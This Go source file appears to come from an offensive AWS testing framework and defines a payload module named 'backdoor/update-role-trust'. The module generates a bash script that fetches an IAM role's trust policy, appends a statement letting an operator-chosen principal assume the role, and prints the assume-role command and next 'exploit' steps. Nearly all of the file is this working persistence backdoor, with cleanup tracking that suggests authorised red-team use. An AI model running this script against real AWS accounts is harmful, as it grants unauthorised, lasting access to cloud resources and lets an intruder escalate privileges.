// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// BackdoorUpdateRoleTrustPayload appends a trust policy statement to an IAM role
// using the instance role's IAM permissions.
type BackdoorUpdateRoleTrustPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorUpdateRoleTrustPayload{})
}

func (p *BackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *BackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Append a trust policy statement to an IAM role using the instance role's IAM permissions"
}

func (p *BackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "Name of the IAM role whose trust policy to modify",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

func (p *BackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	targetRole := options["TARGET_ROLE"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	script := fmt.Sprintf(`echo "Pathrunner: update-role-trust"
echo "Target role: %s"
echo "Trust principal: %s"

TARGET_ROLE="%s"
TRUST_PRINCIPAL="%s"
PRINCIPAL_KEY="%s"

echo "Retrieving current trust policy for role: $TARGET_ROLE..."
ROLE_OUTPUT=$(aws iam get-role --role-name "$TARGET_ROLE" 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not get role: $ROLE_OUTPUT"
    exit 1
fi

CURRENT_POLICY=$(echo "$ROLE_OUTPUT" | jq -r '.Role.AssumeRolePolicyDocument')

NEW_STATEMENT=$(cat <<'NEWSTMT'
{
    "Effect": "Allow",
    "Principal": {
        "%s": "%s"
    },
    "Action": "sts:AssumeRole"
}
NEWSTMT
)

UPDATED_POLICY=$(echo "$CURRENT_POLICY" | jq --argjson stmt "$NEW_STATEMENT" '.Statement += [$stmt]')

echo "Updating trust policy..."
aws iam update-assume-role-policy \
    --role-name "$TARGET_ROLE" \
    --policy-document "$UPDATED_POLICY" 2>&1

if [ $? -eq 0 ]; then
    ROLE_ARN=$(echo "$ROLE_OUTPUT" | jq -r '.Role.Arn')
    echo "SUCCESS: Trust policy updated for role $TARGET_ROLE"
    echo "Principal $TRUST_PRINCIPAL can now assume this role"
    echo "Assume command: aws sts assume-role --role-arn $ROLE_ARN --role-session-name pathrunner-session"
else
    echo "FAILED: Could not update trust policy"
fi
`, targetRole, trustPrincipal, targetRole, trustPrincipal, principalKey, principalKey, trustPrincipal)

	return script, nil
}

func (p *BackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	// Parse the role ARN from the assume command line printed by the bash script.
	var roleARN string
	for _, line := range strings.Split(result, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Assume command: ") {
			// Extract --role-arn value from: aws sts assume-role --role-arn <arn> ...
			parts := strings.Fields(line)
			for i, p := range parts {
				if p == "--role-arn" && i+1 < len(parts) {
					roleARN = parts[i+1]
					break
				}
			}
			break
		}
	}

	if roleARN != "" {
		return fmt.Sprintf("%s\nNext steps:\n  use sts-001\n  set ROLE_ARN %s\n  exploit\n", result, roleARN), nil
	}
	return result, nil
}

// ReportSideEffects returns the trust policy modification as a tracked resource.
func (p *BackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy/%s", options["TARGET_ROLE"]),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"target_role":     options["TARGET_ROLE"],
				"trust_principal": options["TRUST_PRINCIPAL"],
				"original_policy": "retrieve via: aws iam get-role --role-name " + options["TARGET_ROLE"],
			},
		},
	}
}
